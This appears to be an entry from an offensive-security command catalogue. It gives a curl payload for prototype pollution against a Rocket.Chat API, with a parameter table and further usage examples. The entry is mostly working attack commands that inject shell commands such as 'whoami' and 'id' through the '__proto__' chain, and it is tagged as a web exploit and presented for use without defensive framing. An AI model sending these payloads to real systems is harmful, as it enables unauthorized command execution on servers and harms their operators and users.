---
data: >-
  curl -X POST -H "Content-Type: application/json" -H "X-Auth-Token: your-token"
  -H "X-User-Id: your-id" -d '{"__proto__":{"pollutedCmd":"; whoami;"}}'
  http://target-rocketchat.com/api/v1/vulnerable-endpoint
tags:
  - web-exploit
  - prototype-pollution
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 7f741118-01bd-45d5-a556-a7e399314719
created_at: '2025-12-14T17:23:36.778Z'
updated_at: '2025-12-14T17:23:36.778Z'
verified: false
validated: true
submitted: true
---
# curl-prototype-pollution-payload

## Command

```bash
curl -X POST -H "Content-Type: application/json" -H "X-Auth-Token: your-token" -H "X-User-Id: your-id" -d '{"__proto__":{"pollutedCmd":"; whoami;"}}' http://target-rocketchat.com/api/v1/vulnerable-endpoint
```

## Description

This curl command sends a JSON payload to a vulnerable Rocket.Chat API endpoint to exploit prototype pollution by injecting a malicious property into the __proto__ chain, setting up command injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-H "X-Auth-Token: your-token"` | Admin auth token | Yes |
| `-H "X-User-Id: your-id"` | User ID for auth | Yes |
| `-d '{...}'` | JSON payload with __proto__ pollution | Yes |
| `http://target...` | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/json" -d '{"__proto__":{"test":"value"}}' http://localhost:3000/api/v1/test
```

### Advanced Usage

```bash
curl -X POST -H "Content-Type: application/json" -H "X-Auth-Token: abc123" -d '{"__proto__":{"execCmd":"id;"}}' http://target.com/api/v1/settings
 --insecure -v
```

## Expected Output

HTTP 200 OK with success message, e.g., {"status":"success"}. No visible pollution; verify via follow-up requests showing altered object properties.

## Related

- [[Related Procedure|procedures/Exploit-Prototype-Pollution]]
